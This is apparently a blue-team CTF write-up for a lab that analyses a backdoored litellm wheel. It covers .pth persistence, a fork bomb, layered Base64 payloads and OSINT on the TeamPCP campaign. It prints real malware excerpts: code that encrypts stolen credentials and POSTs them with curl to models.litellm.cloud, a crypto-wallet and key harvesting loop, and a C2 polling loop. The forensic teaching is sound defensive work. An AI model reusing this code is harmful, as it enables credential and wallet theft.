# Fork Bomb - TeamPCP Lab

![image.png](image.png)

# Table of Contents
- [Context](#context)
- [Scenario](#scenario)
- [Questions](#questions)

# Context

**Lab link**: [https://cyberdefenders.org/blueteam-ctf-challenges/fork-bomb-teampcp/](https://cyberdefenders.org/blueteam-ctf-challenges/fork-bomb-teampcp/)

**Suggested tools**: CyberChef, Notepad++, Sysmon

**Tactics**: Initial Access, Persistence, Privilege Escalation, Discovery, Collection, Command and Control, Impact

# Scenario

Callum McMahon "`cmcmahon`" is an AI developer who had just been onboarded to work on a new LLM-based project at Maromalix Corp. On April 7, 2026, he was setting up his fresh workstation. While doing that, he noticed CPU usage spiked dramatically, the system became completely unresponsive, and shortly after — it crashed. After reboot, a triage was collected — and luckily, Callum had configured Sysmon earlier, giving us better visibility to work with. Dig in and find out what happened.

# Questions

Q1- While setting up his development environment, `mcmahon` ran a system package update. What timestamp did this activity happen for the first time?

**Answer**: 2026-04-07 16:13

**Explanation**: Searching `/var/log/syslog` for `sudo apt update` shows the first occurrence at that timestamp. The command ran twice, but we only need the first event on line 121.

```powershell
PS C:\Users\Administrator\Desktop\Start Here\Artifacts\uac-ip-172-31-22-208-linux-20260407172738\[root]\var\log> Select-String -Path .\syslog -Pattern 'sudo apt update'

syslog:121:2026-04-07T16:13:10.545523+00:00 ip-172-31-22-208 sysmon: <Event><System><Provider Name="Linux-Sysmon"...<SNIP>...</Data><Data Name="CommandLine">sudo apt update</Data><Data>...<SNIP>...
```

Q2- What exact command did `mcmahon` use to install the Python packages?

**Answer**: `pip install *.whl --break-system-packages`

**Explanation**: Searching `.bash_history` for `pip` activity across the victim users shows the full `pip install` command. `pip` is used to install Python packages.

```powershell
PS C:\Users\Administrator\Desktop\Start Here\Artifacts\uac-ip-172-31-22-208-linux-20260407172738\[root]\home\cmcmahon> Select-String -Path .\.bash_history -Pattern 'pip install'

.bash_history:16:pip install *.whl --break-system-packages
```

Q3- Looking at the full installation command captured in the logs, how many `.whl` package files were installed in total?

**Answer**: 15

**Explanation**: From the `syslog` file, count how many `.whl` package files were installed as a result of this command, which correlates with the one found in `.bash_history`.

```powershell
/usr/bin/python3 /usr/bin/pip install annotated_doc-0.0.4-py3-none-any.whl annotated_types-0.7.0-py3-none-any.whl anyio-4.13.0-py3-none-any.whl click-8.3.2-py3-none-any.whl fastapi-0.135.3-py3-none-any.whl h11-0.16.0-py3-none-any.whl idna-3.11-py3-none-any.whl litellm-1.82.8-py3-none-any.whl pydantic-2.12.5-py3-none-any.whl pydantic_core-2.41.5-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl python_dotenv-1.2.2-py3-none-any.whl starlette-1.0.0-py3-none-any.whl typing_extensions-4.15.0-py3-none-any.whl typing_inspection-0.4.2-py3-none-any.whl uvicorn-0.44.0-py3-none-any.whl --break-system-packages

# Or search the syslog file directly
PS C:\Users\Administrator\Desktop\Start Here\Artifacts\uac-ip-172-31-22-208-linux-20260407172738\[root]\var\log> (Select-String -Path ".\syslog" -Pattern "pip install.*\.whl").Line |
>>   ForEach-Object { $_ -split " " } |
>>   Where-Object { $_ -like "*.whl" } |
>>   Measure-Object

Count    : 15
```

Q4- During the package installation, a file with an unusual extension was written to the Python site-packages directory. This file has a special property — Python automatically processes it every time the interpreter starts, regardless of what script is being run. What is the name of this file?

**Answer**: `litellm_init.pth`

**Explanation**: This is a classic `.pth` file attack (persistence via Python `site-packages`). Again, search for the `.pth` file in `syslog`.

```json
{
   "Event": {
      "System": {
         "Provider": {
            "_Name": "Linux-Sysmon",
            "_Guid": "{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"
         },
<SNIP>
            {
               "_Name": "TargetFilename",
               "__text": "/home/cmcmahon/.local/lib/python3.12/site-packages/litellm_init.pth"
            },
<SNIP>
```

## **Python Site-Packages Persistence via PTH File Injection**

When a `.pth` file is dropped into the site-packages directory, Python processes every line in it when the interpreter starts. If a line begins with `import`, Python executes it. This means arbitrary code can run every time Python is invoked on the system, by any user or process using that interpreter. Site-packages is the directory where Python stores all third-party/external packages. Anything installed via `pip install` lands here. It's separate from Python's own standard library.

This attack falls under the broader pattern of:

- **T1546 - Event Triggered Execution** (MITRE ATT&CK)
- More specifically **T1546.016 - Installer Packages**, and it is often categorized as persistence via **Python path hijacking**

It's stealthy because:

- It blends in with legitimate packages in site-packages.
- `pip install` normally drops files there, so it draws little suspicion.
- It triggers on **any** Python execution — cron jobs, system scripts, apps — not just interactive shells.
- Defenders often focus on `.bashrc`, `cron`, and `systemd` for persistence and miss this.

Common filenames used to blend in look like legitimate packages, such as `distutils-patch.pth`: 

```powershell
Get-ChildItem -Recurse -Filter "*.pth" | Select-Object FullName, LastWriteTime
```

Q5- The file identified in the previous question belongs to a specific installed package. Which package deployed it? (Sysmon is installed and already logging in syslog)

**Answer**: `litellm-1.82.8-py3-none-any.whl`

**Explanation**: Zooming again in the original `pip install` command in `syslog`, we can see the full name of the `.whl` package associated with `litellm`.

```json
<SNIP> litellm-1.82.8-py3-none-any.whl <SNIP>
```

Q6- Without knowing what lurked in his newly installed packages, `mcmahon` ran a routine command that unintentionally triggered the file identified earlier. What was that command?

**Answer**: `python3`

**Explanation**: Any process or user that invokes the Python interpreter will automatically trigger the malicious `.pth` file before any intended script runs. The `python3` command was found in the user’s `.bash_history`.

![image.png](image%201.png)

Q7- When the file identified earlier was triggered, it resulted in a fork bomb — spawning the embedded encoded payload an excessive number of times and making the machine unresponsive. How many times did the encoded payload execute as shown in syslog?

**Answer**: 1580

**Explanation**: Examining the `.pth` file detected previously, we can see the first base 64 encoded payload layer and count how many times it was triggered in syslog.

```json
PS C:\> (Select-String -Path ".\syslog" -Pattern "aW1wb3J[...SNIP...]WN2Y205dmRDZGRP").count
1580
```

![image.png](image%202.png)

![image.png](image%203.png)

Q8- Start your analysis on the full payload. The malware bundled the collected credentials into an encrypted archive before attempting to send it. What was the archive named?

**Answer**: `tpcp.tar.gz`

**Explanation**: The payload has four layers. It starts with a PTH file that runs when Python starts and contains a second, encoded payload. Decoding that Base64 payload reveals a third payload, which contains a final encoded persistence payload. Our focus here is the second layer. Decoding it reveals the encrypted archive the attacker created and uploaded near the end of the script.

```python
try:
            subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
            subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
            subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=subprocess.DEVNULL)
            subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

            subprocess.run([
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
                "https://models.litellm.cloud/",
                "-H", "Content-Type: application/octet-stream",
                "-H", "X-Filename: tpcp.tar.gz",
                "--data-binary", f"@{bn}"
            ], check=True, stderr=subprocess.DEVNULL)
        except Exception:
            pass
```

Q9- What domain was the malware configured to send the collected data to?

**Answer**: `models.litellm.cloud`

**Explanation**: This is shown in the same code block as the previous question in the second payload.

Q10- Beyond cloud credentials and SSH keys, the inner payload also targeted cryptocurrency wallets. How many different cryptocurrencies did it attempt to steal wallet data from?

**Answer**: 10

**Explanation**: We are now in the third payload, decoded from the `B64_SCRIPT` variable in the second payload. It contains multiple targets, including credentials, keys, and cryptocurrency wallets. In this section, the attacker attempts to exfiltrate wallet data for multiple cryptocurrencies.

```python

<SNIP>
for h in homes+['/root']:
    for coin in ['/.bitcoin/bitcoin.conf','/.litecoin/litecoin.conf','/.dogecoin/dogecoin.conf','/.zcash/zcash.conf','/.dashcore/dash.conf','/.ripple/rippled.cfg','/.bitmonero/bitmonero.conf']:
        emit(h+coin)
    walk([h+'/.bitcoin'],2,lambda fp,fn:fn.startswith('wallet') and fn.endswith('.dat'))
    walk([h+'/.ethereum/keystore'],1,lambda fp,fn:True)
    walk([h+'/.cardano'],3,lambda fp,fn:fn.endswith('.skey') or fn.endswith('.vkey'))
    walk([h+'/.config/solana'],3,lambda fp,fn:True)
    for sol in ['/validator-keypair.json','/vote-account-keypair.json','/authorized-withdrawer-keypair.json','/stake-account-keypair.json','/identity.json','/faucet-keypair.json']:
        emit(h+sol)
    walk([h+'/ledger'],3,lambda fp,fn:fn.endswith('.json') or fn.endswith('.bin'))
<SNIP>
```

Q11- The encoded persistence backdoor contains a deactivation condition — a specific string that, if present in the C2 server's response, causes it to silently skip execution of any downloaded payload. What is that string?

**Answer**: `youtube.com`

**Explanation**: The persistence backdoor variable `PERSIST_B64` found in the third payload is the fourth and final payload. When decoded, it reveals the deactivation condition near the end of the script.

```python
if __name__ == "__main__":
    time.sleep(300)
    while True:
        l = g()
        prev = ""
        if os.path.exists(STATE):
            try:
                with open(STATE, "r") as f:
                    prev = f.read().strip()
            except:
                pass

        if l and l != prev and "youtube.com" not in l:
            e(l)

        time.sleep(3000)
```

Q12- The package identified in the previous questions (Q5) was not the only compromised release. Google and read reports about this package compromise to find out about other affected version. What is the other affected version number?

**Answer**: 1.82.7

**Explanation**: Searching for the compromised package online reveals a blog post in which the developers of LiteLLM list the compromised versions of the Python package. Here is one reference: [https://docs.litellm.ai/blog/security-update-march-2026](https://docs.litellm.ai/blog/security-update-march-2026). Quote: “The compromised PyPI packages were **`litellm==1.82.7`** and **`litellm==1.82.8`**. Those packages were live on March 24, 2026 from 10:39 UTC for about 40 minutes before being quarantined by PyPI.”

Q13- As the machine became unresponsive due to the runaway processes, `mcmahon` took immediate action to stop them. What command did he run?

**Answer**: `sudo killall -9 python3`

**Explanation**: This was again found in the `.bash_history` file in the victim’s `home` folder.

![image.png](image%204.png)

Q14- This compromise was part of a large coordinated supply chain campaign carried out by a known threat group. Using open-source threat intelligence, what is the name of the group behind this campaign?

**Answer**: TeamPCP

**Explanation**: Based on online sources, the March 2026 supply chain attack on the LiteLLM Python package (versions 1.82.7 and 1.82.8) was attributed to a threat actor group known as TeamPCP. The attack was part of a broader, coordinated campaign targeting developer and security infrastructure, including the compromise of Aqua Security’s Trivy scanner and Checkmarx KICS.

[Okta](data:image/png;base64,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)

Q15- Returning to the persistence backdoor payload you analyzed earlier — its C2 domain was deliberately crafted to impersonate a legitimate security vendor. That same vendor had one of its GitHub Actions compromised as part of this supply chain campaign, specifically the action responsible for scanning infrastructure-as-code. What is the full GitHub repository path of that compromised Action?

**Answer**: `checkmarx/kics-github-action`

**Explanation**: Again, based on online sources, on March 23, 2026, Checkmarx confirmed a supply chain security incident in which two widely used GitHub Actions, `checkmarx/kics-github-action` and `checkmarx/ast-github-action`, were compromised. The attack was attributed to the threat actor group TeamPCP and involved injecting malicious credential-stealing payloads into the release tags for these actions.

Q16- The AI gateway package `mcmahon` installed did not become malicious on its own. Researchers traced the origin of the campaign back to the compromise of a widely used open-source security scanning tool. What is the name of that tool?

**Answer**: Trivy

**Explanation**: Online sources indicate the attackers compromised the popular vulnerability scanner Trivy (by Aqua Security) and then used it to backdoor LiteLLM, an AI gateway package. Note: An AI gateway is middleware that acts as a secure, centralized intermediary between applications and LLM providers (e.g., OpenAI, Anthropic). It manages AI traffic by providing unified API access, improved security (data masking and key management), cost control, observability (token tracking), and load balancing to optimize AI application deployment and performance.

Q17- The compromise of the tool identified in the previous question had consequences beyond individual developers. The European Commission disclosed a cloud breach directly linked to this supply chain attack. Approximately how much data in GB was exfiltrated from the compromised AWS account?

**Answer**: 91.7

**Explanation**: From the official source at [https://cert.europa.eu/blog/european-commission-cloud-breach-trivy-supply-chain](https://cert.europa.eu/blog/european-commission-cloud-breach-trivy-supply-chain): “A significant volume of data (about 91.7 GB compressed) was exfiltrated from the compromised AWS account, including personal data such as names, email addresses, and email content.”

Q18- The PyPI compromise did not stop with the package `mcmahon` installed. Another legitimate Python SDK belonging to a global communications platform was also backdoored as part of the same campaign. What is the name of that package?

**Answer**: `telnyx`

**Explanation**: On March 27, 2026, TeamPCP compromised the Telnyx Python SDK and published malicious versions **4.87.1** and **4.87.2** of the `telnyx` package to PyPI. Telnyx is a global cloud communications platform. The attack used stolen credentials to embed a three-stage malicious payload that functioned as a remote access tool (RAT) and exfiltrated information to an attacker-controlled server.
